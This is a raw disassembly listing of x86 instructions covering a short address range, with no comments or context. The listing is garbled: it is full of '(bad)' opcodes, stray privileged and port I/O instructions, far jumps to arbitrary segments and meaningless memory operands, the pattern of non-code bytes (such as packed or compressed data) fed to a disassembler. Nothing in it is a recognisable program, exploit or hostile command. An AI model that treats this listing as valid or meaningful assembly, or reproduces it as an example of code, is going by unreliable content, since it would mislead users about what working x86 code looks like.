  41a78c:	or     BYTE PTR [eax-0x6c4140c3],cl
  41a792:	stos   BYTE PTR es:[edi],al
  41a793:	dec    edi
  41a794:	shl    BYTE PTR [ebp+0x385a755d],0x9
  41a79b:	leave  
  41a79c:	pop    ebp
  41a79d:	repz fldcw WORD PTR [ecx+0x4d1e382a]
  41a7a4:	mov    eax,ds:0x84268e3c
  41a7a9:	sbb    edi,eax
  41a7ab:	loope  0x41a788
  41a7ad:	mov    WORD PTR [esi+0x641bc81b],ds
  41a7b3:	mov    al,ds:0xbb62ed31
  41a7b8:	sbb    eax,0xefcb98be
  41a7bd:	adc    DWORD PTR gs:[ebx-0x67b91be4],ecx
  41a7c4:	sub    eax,ebp
  41a7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7c7:	jg     0x41a7d3
  41a7c9:	xchg   ecx,eax
  41a7ca:	fnstenv [eax+0x55e71f6f]
  41a7d0:	shl    BYTE PTR [eax],1
  41a7d2:	lock sub dh,BYTE PTR [edx]
  41a7d5:	es daa 
  41a7d7:	jge    0x41a856
  41a7d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7da:	sub    edx,DWORD PTR [ecx+0xff8cdf2]
  41a7e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7e1:	jns    0x41a772
  41a7e3:	sub    ecx,ecx
  41a7e5:	inc    edi
  41a7e6:	xor    ebx,DWORD PTR [ebx+0xe481baf]
  41a7ec:	xchg   ebx,eax
  41a7ed:	aaa    
  41a7ee:	call   0xa4a5c90e
  41a7f3:	and    cl,BYTE PTR [ecx]
  41a7f5:	popf   
  41a7f6:	jmp    0x5e98:0xb6a15bdf
  41a7fd:	test   al,0x8b
  41a7ff:	mov    ds:0x20aeb3cb,eax
  41a804:	repnz (bad) 
  41a806:	mov    dh,0x81
  41a808:	jne    0x41a7ae
  41a80a:	push   cs
  41a80b:	in     al,dx
  41a80c:	mov    ds,WORD PTR [ebx-0x69c888e8]
  41a812:	sbb    eax,0x1621d725
  41a817:	push   ebp
  41a818:	pop    ebx
  41a819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a81a:	js     0x41a850
  41a81c:	sub    eax,0xa78f14
  41a821:	add    BYTE PTR [eax],al
  41a823:	add    BYTE PTR [eax],al
  41a825:	add    BYTE PTR [ebx+ecx*8],dl
  41a828:	mov    bl,0x9a
  41a82a:	(bad)  
  41a82b:	cli    
  41a82c:	cmp    eax,0x190968cf
  41a831:	mov    ebx,ebx
  41a833:	xor    ah,BYTE PTR [ecx+eax*8+0x17]
  41a837:	mov    ds:0x7220001,al
  41a83c:	add    BYTE PTR [eax],al
  41a83e:	fldenv [edx-0x43]
  41a841:	test   DWORD PTR [ebx],eax
  41a843:	or     eax,0x47303450
  41a848:	mov    eax,0x5f56db8c
  41a84d:	dec    edx
  41a84e:	ret    0x4a8e
  41a851:	dec    eax
  41a852:	pop    edi
  41a853:	(bad)  
  41a854:	js     0x41a82b
  41a856:	ins    DWORD PTR es:[edi],dx
  41a857:	inc    edi
  41a858:	inc    esi
  41a859:	arpl   WORD PTR [ebp-0x5788a34e],si
  41a85f:	int3   
  41a860:	in     al,dx
  41a861:	test   dh,dh
  41a863:	dec    esp
  41a864:	mov    esi,0xd5d96a81
  41a869:	push   ebp
  41a86a:	xor    al,0x22
  41a86c:	pop    eax
  41a86d:	and    al,0x69
  41a86f:	add    DWORD PTR [ecx-0x35],esp
  41a872:	jns    0x41a882
  41a874:	adc    eax,0xbf174354
  41a879:	fnstsw WORD PTR [ebp+0x391bd608]
  41a87f:	fisub  DWORD PTR [esi+eiz*8-0xb]
  41a883:	cmp    eax,0x54384552
  41a889:	imul   DWORD PTR [edi]
  41a88b:	idiv   BYTE PTR [edi]
  41a88d:	mov    ch,0x6c
  41a88f:	adc    cl,ah
  41a891:	sub    bh,BYTE PTR [edx+0x27]
  41a894:	sbb    DWORD PTR [esi],ebx
  41a896:	sub    DWORD PTR [eax+0x72],eax
  41a899:	mov    al,ds:0x311ddc46
  41a89e:	test   BYTE PTR ds:0xed099710,0x49
  41a8a5:	mov    ah,0xa0
  41a8a7:	push   edi
  41a8a8:	push   edi
  41a8aa:	bound  ebp,QWORD PTR [ebx+0x11441b1f]
  41a8b0:	ret    
  41a8b1:	lea    edx,[esi-0x3e949b66]
  41a8b7:	nop
  41a8b8:	inc    eax
  41a8b9:	xor    DWORD PTR [edx-0x6],esi
  41a8bc:	xchg   ecx,eax
  41a8bd:	fstp   QWORD PTR [esi+0x422ca2b1]
  41a8c3:	sbb    ebx,DWORD PTR [edx]
  41a8c5:	lea    esp,[eax-0x56]
  41a8c8:	mov    eax,ds:0xc25679c5
  41a8cd:	sbb    DWORD PTR [ebx+0x44d2994d],ebp
  41a8d3:	in     al,0x79
  41a8d5:	lds    ebx,FWORD PTR [esi]
  41a8d7:	xor    ch,BYTE PTR [ebp-0x231f75a3]
  41a8dd:	jns    0x41a913
  41a8df:	adc    eax,0xeecf1561
  41a8e4:	pop    ss
  41a8e5:	xchg   DWORD PTR [ecx],ecx
  41a8e7:	retf   
  41a8e8:	aas    
  41a8e9:	cs push ebx
  41a8eb:	aad    0xd8
  41a8ed:	mov    esp,0xf80eca
  41a8f2:	fnstcw WORD PTR ss:[ebx]
  41a8f5:	push   es
  41a8f6:	jle    0x41a902
  41a8f8:	push   ds
  41a8f9:	pushf  
  41a8fa:	lahf   
  41a8fb:	ss popa 
  41a8fd:	pop    esi
  41a8fe:	add    DWORD PTR [edx-0x4f],edi
  41a901:	inc    esp
  41a902:	cmp    bh,BYTE PTR [eax-0x64]
  41a905:	rol    DWORD PTR es:[edx+0x25265baa],cl
  41a90c:	sub    eax,0xfffffff2
  41a90f:	(bad)  
  41a910:	out    0xd0,eax
  41a912:	in     eax,0xa
  41a914:	clc    
  41a915:	test   DWORD PTR [eax-0xa0e31c5],ebx
  41a91b:	jns    0x41a954
  41a91d:	xlat   BYTE PTR ds:[ebx]
  41a91e:	ss push ss
  41a920:	lods   al,BYTE PTR ds:[esi]
  41a921:	loopne 0x41a8e0
  41a923:	xchg   ch,ah
  41a925:	aam    0x13
  41a927:	lahf   
  41a928:	popf   
  41a929:	fmul   QWORD PTR [edx-0x587f2d8]
  41a92f:	push   0xffffff92
  41a931:	inc    esp
  41a932:	cmp    ch,ah
  41a934:	cmp    DWORD PTR [ebx+0x2d942bd4],eax
  41a93a:	test   DWORD PTR [esi],ecx
  41a93c:	sbb    al,0x3c
  41a93e:	adc    DWORD PTR [ecx-0x7a],edx
  41a941:	jg     0x41a9b4
  41a943:	push   ebp
  41a944:	inc    esp
  41a945:	jge    0x41a971
  41a947:	pop    edi
  41a948:	cli    
  41a949:	jg     0x41a966
  41a94b:	inc    BYTE PTR [ecx-0x74be8847]
  41a951:	in     eax,0x10
  41a953:	loopne 0x41a8dc
  41a955:	popf   
  41a956:	mov    edx,0xf4042893
  41a95b:	pop    es
  41a95c:	jbe    0x41a965
  41a95e:	push   cs
  41a95f:	test   al,0xf6
  41a961:	shl    DWORD PTR [esp+eax*2+0x43c89d38],1
  41a968:	sbb    al,0x2
  41a96a:	jne    0x41a94d
  41a96c:	outs   dx,DWORD PTR ds:[esi]
  41a96d:	dec    esi
  41a96e:	xlat   BYTE PTR ds:[ebx]
  41a96f:	ficom  DWORD PTR [eax]
  41a971:	int3   
  41a972:	pop    es
  41a973:	mov    ebp,0x77adfa42
  41a978:	sub    ecx,DWORD PTR [edx-0x64]
  41a97b:	out    0x26,eax
  41a97d:	popa   
  41a97e:	call   0x1642867a
  41a983:	sub    BYTE PTR [eax-0x54e58f66],0x94
  41a98a:	or     DWORD PTR ds:0xf2c9e7d,eax
  41a990:	lds    eax,FWORD PTR [eax-0x34d74504]
  41a996:	out    0x74,al
  41a998:	dec    ecx
  41a999:	inc    edx
  41a99a:	repz fidivr WORD PTR [edx]
  41a99d:	ss std 
  41a99f:	dec    esi
  41a9a0:	jne    0x41a960
  41a9a2:	stc    
  41a9a3:	and    ah,ah
  41a9a5:	mov    ch,0x8c
  41a9a7:	icebp  
  41a9a8:	jb     0x41a9e1
  41a9aa:	icebp  
  41a9ab:	mov    ebp,edi
  41a9ad:	ins    BYTE PTR es:[edi],dx
  41a9ae:	and    al,0x23
  41a9b0:	data16 ja 0x41a966
  41a9b3:	stos   BYTE PTR es:[edi],al
  41a9b4:	fwait
  41a9b5:	mov    dh,0x21
  41a9b7:	sbb    eax,0x1aeea2c1
  41a9bc:	xor    al,0x32
  41a9be:	mov    ah,0xc7
  41a9c0:	push   edi
  41a9c1:	in     eax,dx
  41a9c2:	fiadd  DWORD PTR ds:0xd99ac223
  41a9c8:	and    al,0x78
  41a9ca:	in     eax,0xad
  41a9cc:	and    ah,BYTE PTR [ebp+0x3553bd8f]
  41a9d2:	jge    0x41aa23
  41a9d4:	test   al,0xeb
  41a9d6:	mov    bl,0x46
  41a9d8:	fninit 
  41a9da:	push   ds
  41a9db:	cmp    BYTE PTR [ecx-0x5a],0xf5
  41a9df:	(bad)  
  41a9e0:	int    0x61
  41a9e2:	xor    BYTE PTR [esi-0x13902fb7],dh
  41a9e8:	inc    ecx
  41a9e9:	add    eax,0xcc97791e
  41a9ee:	jecxz  0x41a9e1
  41a9f0:	push   ds
  41a9f1:	sbb    DWORD PTR ds:0xd7b6cf9c,edx
  41a9f7:	and    BYTE PTR [eax+0x3e],bl
  41a9fa:	(bad)  
  41a9fb:	push   ecx
  41a9fc:	push   ss
  41a9fd:	dec    esi
  41a9fe:	mov    ch,0x70
  41aa00:	sub    al,ah
  41aa02:	jbe    0x41a9a5
  41aa04:	loop   0x41a98f
  41aa06:	gs xchg esi,edx
  41aa09:	jmp    0x41a9a7
  41aa0b:	mov    dh,0x25
  41aa0d:	mov    DWORD PTR [edi-0x27],esi
  41aa10:	popa   
  41aa11:	shl    DWORD PTR [esp+eax*8-0x80],1
  41aa15:	add    BYTE PTR [ebp-0xb],cl
  41aa18:	push   ebp
  41aa19:	mov    eax,0x56481973
  41aa1e:	ins    DWORD PTR es:[edi],dx
  41aa1f:	fiadd  DWORD PTR [esi-0x3ee9d4fc]
  41aa25:	jno    0x41aa7f
  41aa27:	adc    ah,BYTE PTR [eax]
  41aa29:	ds jle 0x41aa2e
  41aa2c:	xor    DWORD PTR [eax+0x13edc796],edi
  41aa32:	enter  0xb675,0x5
  41aa36:	push   es
  41aa37:	call   0x2f8:0xde5f59e5
  41aa3e:	sbb    eax,0x5e1b677f
  41aa43:	xor    DWORD PTR [esi+0x2d],edi
  41aa46:	jl     0x41a9f6
  41aa48:	sbb    dl,BYTE PTR [ebp+0x71f591b0]
  41aa4e:	imul   eax,edi,0x74cbbdd
  41aa54:	jge    0x41aa19
  41aa56:	cld    
  41aa57:	jecxz  0x41aa67
  41aa59:	inc    edx
  41aa5a:	aam    0x5a
  41aa5c:	cmp    cl,BYTE PTR [ecx-0x48]
  41aa5f:	stos   BYTE PTR es:[edi],al
  41aa60:	leave  
  41aa61:	es daa 
  41aa63:	xchg   esi,eax
  41aa64:	sub    BYTE PTR [ebp-0x64],bh
  41aa67:	popf   
  41aa68:	mov    dl,0x5f
  41aa6a:	jno    0x41aaa0
  41aa6c:	fisttp QWORD PTR [edx+0x13]
  41aa6f:	pop    esp
  41aa70:	sbb    al,0x2b
  41aa72:	shl    eax,1
  41aa74:	js     0x41aa06
  41aa76:	inc    esi
  41aa77:	test   al,0x96
  41aa79:	ds scas eax,DWORD PTR es:[edi]
  41aa7b:	mov    dl,0x1d
  41aa7d:	fidiv  DWORD PTR [ebx]
  41aa7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa80:	cmp    al,0x8c
  41aa82:	xor    edi,DWORD PTR [edi+0x3a7aa993]
  41aa88:	xlat   BYTE PTR ds:[ebx]
  41aa89:	push   ebx
  41aa8a:	mov    esi,0x41fabab9
  41aa8f:	sub    DWORD PTR [ecx-0xe],edx
  41aa92:	ins    BYTE PTR es:[edi],dx
  41aa93:	pop    es
  41aa94:	repz xor bl,BYTE PTR [esi-0x65]
  41aa98:	fbstp  TBYTE PTR [edi+0x41414e37]
  41aa9e:	mov    DWORD PTR [edx-0x42],edi
  41aaa1:	and    ecx,DWORD PTR [eax+eax*1-0x6f352a3d]
  41aaa8:	sbb    eax,0x15f02d0c
  41aaad:	fs xor eax,0x717eeddd
  41aab3:	fdiv   DWORD PTR [ebx-0x38]
  41aab6:	xchg   ebp,eax
  41aab7:	jmp    0x41aa69
  41aab9:	mov    eax,0xcef2dce
  41aabe:	das    
  41aabf:	xor    BYTE PTR [ecx+0x54],dl
  41aac2:	xchg   ebx,eax
  41aac3:	loope  0x41ab3a
  41aac5:	fcmovb st,st(3)
  41aac7:	dec    ebp
  41aac8:	cmc    
  41aac9:	lock xor DWORD PTR [edx-0x61],ecx
  41aacd:	push   ecx
  41aace:	(bad)  
  41aacf:	sbb    edi,DWORD PTR [ebx+0x6]
  41aad2:	icebp  
  41aad3:	fs push ss
  41aad5:	pusha  
  41aad6:	cmp    BYTE PTR [esi],dh
  41aad8:	(bad)  
  41aad9:	in     eax,dx
  41aada:	out    0xcc,eax
  41aadc:	fcomp  QWORD PTR [ebx-0x26]
  41aadf:	test   DWORD PTR [esp+esi*4-0x68],edi
  41aae3:	or     eax,0x7190649e
  41aae8:	mov    BYTE PTR [eax+ecx*4-0x120afb60],0xfc
  41aaf0:	icebp  
  41aaf1:	inc    edx
  41aaf2:	test   DWORD PTR [edi-0x9cf7217],edi
  41aaf8:	and    eax,0xe4cde519
  41aafd:	in     al,dx
  41aafe:	push   cs
  41aaff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab00:	pop    edx
  41ab01:	aam    0x4a
  41ab03:	imul   esi,DWORD PTR [esi],0x5457b3
  41ab09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab0a:	stc    
  41ab0b:	popf   
  41ab0c:	mov    ah,0xc0
  41ab0e:	or     eax,0x3a6a3f9
  41ab13:	dec    esi
  41ab14:	push   edi
  41ab15:	inc    ebp
  41ab16:	outs   dx,BYTE PTR ds:[esi]
  41ab17:	scas   al,BYTE PTR es:[edi]
  41ab18:	mov    BYTE PTR [edx+0x3c77dffb],bh
  41ab1e:	stos   BYTE PTR es:[edi],al
  41ab1f:	dec    ebp
  41ab20:	push   0x70b7d087
  41ab25:	sbb    edx,DWORD PTR cs:[ebx+0x5]
  41ab29:	mov    ah,0x15
  41ab2b:	fisttp DWORD PTR [ebp-0x43a3d1e8]
  41ab31:	xor    DWORD PTR [ebp+0x32ef6362],esi
  41ab37:	pop    ds
  41ab38:	mov    edx,0xba1831fc
  41ab3d:	in     eax,dx
  41ab3e:	and    al,0xbd
  41ab40:	cmp    al,0xca
  41ab42:	iret   
  41ab43:	xor    DWORD PTR fs:[ebx+0x7b],edi
  41ab47:	dec    esp
  41ab48:	cmp    dl,BYTE PTR [ecx-0x7b]
  41ab4b:	cmp    eax,0xc61316a3
  41ab50:	cld    
  41ab51:	fsub   QWORD PTR [edi]
  41ab53:	into   
  41ab54:	jb     0x41ab19
  41ab56:	sti    
  41ab57:	inc    esi
  41ab58:	pop    ebx
  41ab59:	out    dx,eax
  41ab5a:	xor    DWORD PTR [ebx-0x69],ecx
  41ab5d:	push   edi
  41ab5e:	bound  esp,QWORD PTR [edi]
  41ab60:	sbb    eax,0x9536625a
  41ab65:	call   0x120c:0xaa171fbc
  41ab6c:	hlt    
  41ab6d:	and    al,0x40
  41ab6f:	rcr    BYTE PTR [ebx-0x38016769],cl
  41ab75:	call   0xf33eeec2
  41ab7a:	out    0x5c,eax
  41ab7c:	rcr    ecx,cl
  41ab7e:	mov    WORD PTR [ebp+0x27fad413],es
  41ab84:	inc    esp
  41ab85:	mov    ah,0x2c
  41ab87:	aad    0xb1
  41ab89:	mov    al,0x21
  41ab8b:	mov    bl,0x94
  41ab8d:	jb     0x41ab38
  41ab8f:	mov    esi,0xd5511841
  41ab94:	xor    BYTE PTR [eax+ebp*1],dh
  41ab97:	ins    DWORD PTR es:[di],dx
  41ab99:	add    BYTE PTR [ecx+ebx*4+0x3a],0xb3
  41ab9e:	inc    eax
  41ab9f:	aam    0xf7
  41aba1:	int3   
  41aba2:	test   al,0x61
  41aba4:	outs   dx,BYTE PTR ds:[esi]
  41aba5:	adc    DWORD PTR [edi+edi*1-0x1f],ecx
  41aba9:	imul   BYTE PTR [eax+esi*4+0x2ca60aac]
  41abb0:	jge    0x41abf4
  41abb2:	sti    
  41abb3:	in     al,0xb8
  41abb5:	dec    esi
  41abb6:	lahf   
  41abb7:	test   edi,esp
  41abb9:	int    0x4d
  41abbb:	inc    ebx
  41abbc:	push   cs
  41abbd:	adc    esp,DWORD PTR [edx+edx*8+0x6c]
  41abc1:	jns    0x41ab99
  41abc3:	fs repz pop ss
  41abc6:	popf   
  41abc7:	add    cl,BYTE PTR [edi-0x4e60d810]
  41abcd:	pushf  
  41abce:	or     DWORD PTR ds:0xd4f55dfb,edi
  41abd4:	pop    ebx
  41abd5:	mov    ch,0x52
  41abd7:	jg     0x41abec
  41abd9:	mov    esi,DWORD PTR [edi+ecx*2+0xc6cb72c]
  41abe0:	mov    ds:0xfc6d445f,al
  41abe5:	push   0x65966b39
  41abea:	sub    ecx,ebx
  41abec:	push   es
  41abed:	jg     0x41abc7
  41abef:	pop    ss
  41abf0:	(bad)  
  41abf1:	jmp    0x3b44:0xdf8c8f3d
  41abf8:	xchg   esp,eax
  41abf9:	mov    ds:0xffb2ae9b,al
  41abfe:	(bad)  
  41abff:	mov    ebp,0x96067ba8
  41ac04:	add    BYTE PTR [edi+0x5c],al
  41ac07:	and    al,0x31
  41ac09:	adc    eax,0xef0be4f
  41ac0e:	sbb    al,0xa8
  41ac10:	adc    DWORD PTR [edi+eiz*1+0x6d4c6b26],esp
  41ac17:	ficom  WORD PTR [eax-0x7d1eac04]
  41ac1d:	(bad)  
  41ac1e:	sar    BYTE PTR [edx+0x22c83b65],1
  41ac24:	jo     0x41ac65
  41ac26:	xchg   edi,eax
  41ac27:	xor    al,0x88
  41ac29:	add    dh,BYTE PTR [ebx+0xcbf0c16]
  41ac2f:	dec    eax
  41ac30:	into   
  41ac31:	mov    DWORD PTR [ecx+0x6e],edx
  41ac34:	rcr    DWORD PTR [ecx],0x42
  41ac37:	cmp    DWORD PTR ds:0x67677519,0x1c
  41ac3e:	or     bh,0x2f
  41ac41:	pop    esi
  41ac42:	es cdq 
  41ac44:	test   eax,0xea454bb1
  41ac49:	jl     0x41abde
  41ac4b:	cli    
  41ac4c:	mov    ebx,0x1b01b092
  41ac51:	dec    BYTE PTR [ebx+0xa12786d]
  41ac57:	sub    eax,0x2c49e0e5
  41ac5c:	outs   dx,BYTE PTR ds:[esi]
  41ac5d:	adc    dh,dh
  41ac5f:	push   eax
  41ac60:	inc    edi
  41ac61:	xchg   esi,eax
  41ac62:	nop
  41ac63:	ss loopne 0x41ac6d
  41ac66:	jge    0x41acd0
  41ac68:	xchg   edi,eax
  41ac69:	std    
  41ac6a:	add    BYTE PTR [eax],ch
  41ac6c:	sub    DWORD PTR [ebx+0x17],0xffffffe3
  41ac70:	fidivr WORD PTR [esi+esi*1]
  41ac73:	repnz repz (bad) 
  41ac76:	jns    0x41ac0d
  41ac78:	adc    al,0x21
  41ac7a:	rol    DWORD PTR [edi],0x75
  41ac7d:	inc    esp
  41ac7e:	inc    esp
  41ac7f:	sub    DWORD PTR [edi-0x7b],esp
  41ac82:	push   ss
  41ac83:	mov    ecx,0xbcc6ba64
  41ac88:	ds and esp,eax
  41ac8b:	inc    ebx
  41ac8c:	adc    al,0xd3
  41ac8e:	bsf    ebx,DWORD PTR [esi+0x5a]
  41ac92:	jne    0x41ac2b
  41ac94:	add    al,0x68
  41ac96:	bound  ebp,QWORD PTR [edx+0x3f]
  41ac99:	push   ebx
  41ac9a:	cmp    eax,0x9753cd99
  41ac9f:	aaa    
  41aca0:	or     BYTE PTR [edi],ah
  41aca2:	test   al,0x81
  41aca4:	add    ch,BYTE PTR [edi-0x4c]
  41aca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aca9:	daa    
  41acaa:	sub    BYTE PTR [eax+0x7a01fc9],0x8
  41acb1:	je     0x41ad11
  41acb3:	mov    ebp,0xf0d05768
  41acb8:	shl    BYTE PTR [ebx],0xc9
  41acbb:	inc    eax
  41acbc:	jno    0x41ad16
  41acbe:	xor    edx,DWORD PTR [eax+ecx*4+0x38]
  41acc2:	dec    ecx
  41acc3:	and    bh,dh
  41acc5:	or     eax,0x500286b2
  41acca:	add    ah,BYTE PTR [edx+0xc926b6a]
  41acd0:	ret    0xad01
  41acd3:	xchg   ecx,edi
  41acd5:	test   DWORD PTR [edx-0x79ba73b7],edi
  41acdb:	aaa    
  41acdc:	push   0x3
  41acde:	(bad)  [ebp-0xe]
  41ace1:	jbe    0x41acb7
  41ace3:	inc    ebx
  41ace4:	cmp    esp,DWORD PTR [edi+0x6d]
  41ace7:	jae    0x41ad1e
  41ace9:	xchg   esi,eax
  41acea:	sbb    al,0x63
  41acec:	out    0x0,al
  41acee:	pop    edi
  41acef:	pop    ss
  41acf0:	test   al,ch
  41acf2:	cdq    
  41acf3:	adc    eax,0x539b1eb3
  41acf8:	in     al,dx
  41acf9:	jmp    0xeb7e3756
  41acfe:	or     eax,0x1b1148e5
  41ad03:	std    
  41ad04:	mov    ch,BYTE PTR [ecx+ecx*4+0x63]
  41ad08:	cmp    ch,cl
  41ad0a:	sub    DWORD PTR [ebx+0x2fc52a3f],0xa1877ad6
  41ad14:	pop    ebp
  41ad15:	sub    ebx,DWORD PTR [esi+eax*1-0x2e]
  41ad19:	clc    
  41ad1a:	or     esp,DWORD PTR ds:0x2faf39cd
  41ad20:	hlt    
  41ad21:	xchg   DWORD PTR [ecx+0x66f6f3b2],ebp
  41ad27:	dec    ecx
  41ad28:	lahf   
  41ad29:	retf   
  41ad2a:	pop    esi
  41ad2b:	inc    edi
  41ad2c:	retf   
  41ad2d:	ret    0xd92e
  41ad30:	dec    ebp
  41ad31:	jle    0x41ad07
  41ad33:	xchg   DWORD PTR [ebp+0x6e3ff5a6],eax
  41ad39:	mov    esp,DWORD PTR [ecx]
  41ad3b:	ror    ecx,cl
  41ad3d:	sbb    ah,BYTE PTR [ebx+0x6c1d80bf]
  41ad43:	pop    ebp
  41ad44:	xchg   esi,eax
  41ad45:	and    BYTE PTR [edi-0x4f],dl
  41ad48:	outs   dx,DWORD PTR ds:[esi]
  41ad49:	mov    esp,0xf8225a6a
  41ad4e:	pop    ebp
  41ad4f:	sbb    bl,ch
  41ad51:	lahf   
  41ad52:	fs inc edx
  41ad54:	lods   al,BYTE PTR ds:[esi]
  41ad55:	push   edi
  41ad56:	sbb    ch,ah
  41ad58:	sbb    eax,0x12a84c57
  41ad5d:	stos   BYTE PTR es:[edi],al
  41ad5e:	mov    esi,ecx
  41ad60:	int    0x6c
  41ad62:	cmp    bl,bh
  41ad64:	cmc    
  41ad65:	sbb    al,0x4f
  41ad67:	fidiv  DWORD PTR [ebp+0x51]
  41ad6a:	jbe    0x41ad07
  41ad6c:	(bad)  
  41ad6d:	popa   
  41ad6e:	inc    esi
  41ad6f:	lea    esi,[edi]
  41ad71:	aad    0x64
  41ad73:	dec    esp
  41ad74:	cmp    eax,0xdf6be61b
  41ad79:	bound  esi,QWORD PTR [eax-0x32]
  41ad7c:	ds fwait
  41ad7e:	mov    eax,0x91c39190
  41ad83:	add    eax,0x6dbc6d86
  41ad88:	push   ss
  41ad89:	xor    dl,dl
  41ad8b:	int3   
  41ad8c:	mov    esp,DWORD PTR [edi+0x5d]
  41ad8f:	sbb    BYTE PTR [edx],bh
  41ad91:	stos   DWORD PTR es:[edi],eax
  41ad92:	fst    st(3)
  41ad94:	call   DWORD PTR [eax-0x56]
  41ad97:	push   edi
  41ad98:	shl    BYTE PTR [ebp-0x15],cl
  41ad9b:	repz fist DWORD PTR [ebx+0x4e]
  41ad9f:	aam    0xef
  41ada1:	in     eax,dx
  41ada2:	stc    
  41ada3:	in     eax,0x4
  41ada5:	cmp    eax,DWORD PTR [ebp+0x668bf9]
  41adab:	cmp    al,0x5
  41adad:	in     eax,dx
  41adae:	test   bh,bl
  41adb0:	aad    0xe1
  41adb2:	add    BYTE PTR [edi],0x3d
  41adb5:	into   
  41adb6:	das    
  41adb7:	out    dx,eax
  41adb8:	pusha  
  41adb9:	add    dh,al
  41adbb:	cdq    
  41adbc:	dec    ebp
  41adbd:	jae    0x41adc3
  41adbf:	dec    esp
  41adc0:	rol    eax,0x4f
  41adc3:	mul    dh
  41adc5:	xchg   BYTE PTR [eax*1+0x7ec8d914],cl
  41adcc:	adc    BYTE PTR [esi],0x66
  41adcf:	fs int3 
  41add1:	pop    ebp
  41add2:	mov    WORD PTR [edx-0x48],gs
  41add5:	add    bl,ah
  41add7:	inc    esp
  41add8:	inc    edx
  41add9:	sub    eax,0xd2c63067
  41adde:	or     bl,BYTE PTR [ecx-0x824cb1f]
  41ade4:	add    BYTE PTR [edx+eiz*1],ch
  41ade7:	jmp    0x41ada6
  41ade9:	jle    0x41ad76
  41adeb:	sbb    dh,dl
  41aded:	push   es
  41adee:	cmp    ah,al
  41adf0:	(bad)  
  41adf2:	(bad)  
  41adf3:	into   
  41adf4:	inc    ecx
  41adf5:	push   edi
  41adf6:	cmp    DWORD PTR [edi+0x19],edi
  41adf9:	cs out 0x57,al
  41adfc:	ds leave 
  41adfe:	push   0x79
  41ae00:	mov    edi,cs
  41ae02:	ror    BYTE PTR [ebx+0x2b],0xc6
  41ae06:	arpl   WORD PTR [ecx+0x688756b6],si
  41ae0c:	mov    ?,WORD PTR [edi-0x18f065c5]
  41ae12:	rol    DWORD PTR [edx-0x1ed3514e],cl
  41ae18:	ss jns 0x41addc
  41ae1b:	into   
  41ae1c:	aas    
  41ae1d:	and    BYTE PTR [eax+0x6c],0x10
  41ae21:	xchg   ebp,eax
  41ae22:	cmp    eax,0x7531ef63
  41ae27:	pop    ebx
  41ae28:	jbe    0x41ae07
  41ae2a:	call   0x132bd2af
  41ae2f:	lock or DWORD PTR [edi+0x28b58a21],0xffffffce
  41ae37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae38:	gs push ebp
  41ae3a:	inc    ebx
  41ae3b:	adc    al,0x1b
  41ae3d:	jno    0x41aebb
  41ae3f:	jb     0x41ade4
  41ae41:	dec    esp
  41ae42:	or     al,0xc3
  41ae44:	mov    bh,BYTE PTR [edx]
  41ae46:	jmp    0x227:0x8cdefadf
  41ae4d:	xlat   BYTE PTR ds:[ebx]
  41ae4e:	test   BYTE PTR [esi-0x1857716e],al
  41ae54:	popa   
  41ae55:	(bad)  
  41ae56:	in     eax,dx
  41ae57:	out    0xea,al
  41ae59:	pushf  
  41ae5a:	(bad)  
  41ae5b:	leave  
  41ae5c:	add    BYTE PTR [ebx],0x41
  41ae5f:	in     al,0x2c
  41ae61:	xchg   esp,eax
  41ae62:	cmp    edx,ecx
  41ae64:	pop    esp
  41ae65:	aas    
  41ae66:	dec    edx
  41ae67:	sti    
  41ae68:	or     BYTE PTR [edx-0x4a],dh
  41ae6b:	mov    ebp,0xce1fdfe5
  41ae70:	stc    
  41ae71:	pop    edi
  41ae72:	stc    
  41ae73:	(bad)  [esi+0x23]
  41ae76:	pop    eax
  41ae77:	add    al,0xbb
  41ae79:	test   eax,0x4cd37689
  41ae7e:	pushf  
  41ae7f:	inc    BYTE PTR [esi]
  41ae81:	lds    eax,FWORD PTR [ebp+0x4c]
  41ae84:	lods   eax,DWORD PTR ds:[esi]
  41ae85:	aaa    
  41ae86:	or     ch,BYTE PTR [ebp+0x2a]
  41ae89:	dec    esp
  41ae8a:	aas    
  41ae8b:	push   0x77
  41ae8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae8e:	sti    
  41ae8f:	arpl   WORD PTR [edi],sp
  41ae91:	shl    BYTE PTR [esi-0x1f],1
  41ae94:	jo     0x41ae29
  41ae96:	add    dh,al
  41ae98:	not    ah
  41ae9a:	mov    ebp,DWORD PTR [ecx-0x2b]
  41ae9d:	jae    0x41ae9b
  41ae9f:	div    BYTE PTR [ebp-0x26]
  41aea2:	jno    0x41af21
  41aea4:	cmp    eax,0x1f22a0ae
  41aea9:	jl     0x41ae5a
  41aeab:	mov    al,0x53
  41aead:	or     al,0x41
  41aeaf:	(bad)  [ecx-0x12319f47]
  41aeb5:	adc    eax,0xfac24d8f
  41aeba:	cld    
  41aebb:	pusha  
  41aebc:	adc    eax,0xd844f7d3
  41aec1:	xlat   BYTE PTR ds:[ebx]
  41aec2:	xlat   BYTE PTR ds:[ebx]
  41aec3:	mov    ax,di
  41aec6:	mov    eax,0xdeb6731e
  41aecb:	nop
  41aecc:	add    BYTE PTR [ebp-0x1a],ch
  41aecf:	fisttp DWORD PTR [esi+edi*2+0x7b6ecb3e]
  41aed6:	jle    0x41aef2
  41aed8:	mov    esp,0x7bdb7cb9
  41aedd:	(bad)  
  41aede:	into   
  41aedf:	inc    edi
  41aee0:	mov    ebx,0x3680ccf6
  41aee5:	xchg   esi,eax
  41aee6:	stos   BYTE PTR es:[edi],al
  41aee7:	push   ebx
  41aee8:	scas   al,BYTE PTR es:[edi]
  41aee9:	jl     0x41aefa
  41aeeb:	or     eax,0x3085228f
  41aef0:	adc    BYTE PTR [edi-0x7b],bh
  41aef3:	mov    bl,ch
  41aef5:	dec    edi
  41aef6:	stc    
  41aef7:	mov    WORD PTR [ebx+0x2324e293],?
  41aefd:	mov    esp,0xec3a7a8a
  41af02:	push   edx
